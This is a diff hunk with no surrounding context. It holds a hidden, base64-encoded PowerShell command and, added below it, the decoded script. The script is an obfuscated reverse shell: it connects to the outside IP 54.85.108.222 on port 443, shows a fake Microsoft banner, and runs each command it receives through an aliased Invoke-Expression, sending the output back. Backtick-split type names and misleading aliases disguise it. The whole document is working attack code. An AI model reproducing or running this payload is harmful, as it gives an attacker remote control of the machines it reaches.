@@ -1,1 +1,22 @@
 powershell.exe -nop -w hidden -e U2V0LUFsaWFzIC1OYW1lIEsgLVZhbHVlIE91dC1TdHJpbmcNClNldC1BbGlhcyAtTmFtZSBub3RoaW5nSGVyZSAtVmFsdWUgaWV4DQokQlRYID0gTmV3LU9iamVjdCAiU2B5YHN0ZW0uTmV0LlNgb2Bja2V0cy5UYENQQ2xgaWVudCIoIjU0Ljg1LjEwOC4yMjIiLDQ0Myk7DQokcmVwbGFjZSA9ICRCVFguR2V0U3RyZWFtKCk7DQpbYnl0ZVtdXSRCID0gMC4uKDMyNzY4KjItMSl8JXswfTsNCiRCID0gKFt0ZXh0LmVuY29kaW5nXTo6VVRGOCkuR2V0Qnl0ZXMoIihjKSBNaWNyb3NvZnQgQ29ycG9yYXRpb24uIEFsbCByaWdodHMgcmVzZXJ2ZWQuYG5gbiIpDQokcmVwbGFjZS5Xcml0ZSgkQiwwLCRCLkxlbmd0aCkNCiRCID0gKFt0ZXh0LmVuY29kaW5nXTo6QVNDSUkpLkdldEJ5dGVzKChHZXQtTG9jYXRpb24pLlBhdGggKyAnPicpDQokcmVwbGFjZS5Xcml0ZSgkQiwwLCRCLkxlbmd0aCkNCltieXRlW11dJGludCA9IDAuLigxMDAwMCs1NTUzNSl8JXswfTsNCndoaWxlKCgkaSA9ICRyZXBsYWNlLlJlYWQoJGludCwgMCwgJGludC5MZW5ndGgpKSAtbmUgMCl7Ow0KJFJPTVggPSBbdGV4dC5lbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkaW50LDAsICRpKTsNCiRJID0gKG5vdGhpbmdIZXJlICRST01YIDI+JjEgfCBLICk7DQokSTIgID0gJEkgKyAocHdkKS5QYXRoICsgJz4gJzsNCiRVID0gW3RleHQuZW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygkSTIpOw0KJHJlcGxhY2UuV3JpdGUoJFUsMCwkVS5MZW5ndGgpOw0KJFhZTiA9ICJPZmZpY2UiDQokcmVwbGFjZS5GbHVzaCgpfTsNCiRCVFguQ2xvc2UoKQ==
+
+
+Set-Alias -Name K -Value Out-String
+Set-Alias -Name nothingHere -Value iex
+$BTX = New-Object "S`y`stem.Net.S`o`ckets.T`CPCl`ient"("54.85.108.222",443);
+$replace = $BTX.GetStream();
+[byte[]]$B = 0..(32768*2-1)|%{0};
+$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
+$replace.Write($B,0,$B.Length)
+$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
+$replace.Write($B,0,$B.Length)
+[byte[]]$int = 0..(10000+55535)|%{0};
+while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
+$ROMX = [text.encoding]::ASCII.GetString($int,0, $i);
+$I = (nothingHere $ROMX 2>&1 | K );
+$I2  = $I + (pwd).Path + '> ';
+$U = [text.encoding]::ASCII.GetBytes($I2);
+$replace.Write($U,0,$U.Length);
+$XYN = "Office"
+$replace.Flush()};
+$BTX.Close()
